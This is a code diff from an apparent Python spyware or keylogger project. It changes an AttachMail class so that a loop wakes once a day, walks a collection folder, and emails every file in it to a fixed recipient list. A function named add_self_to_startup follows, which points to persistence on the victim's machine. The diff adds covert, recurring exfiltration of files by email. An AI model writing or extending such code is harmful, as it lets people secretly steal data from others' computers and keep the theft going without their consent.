@@ -367,13 +367,15 @@ class AttachMail():
         msg.attach(part)
         self.mailServer.sendmail(Constants.EMAIL_LOGIN, to, msg.as_string())
     def sendMailInFolder(self):
-        self.start_server()
-        for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
-            for each in files:
-                temp=str(each)
-                temp=os.path.join(root,temp)
-                self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
-        self.stop_server()
+        while True:
+            time.sleep(86400)
+            self.start_server()
+            for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
+                for each in files:
+                    temp=str(each)
+                    temp=os.path.join(root,temp)
+                    self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
+            self.stop_server()
 
 
 def add_self_to_startup():
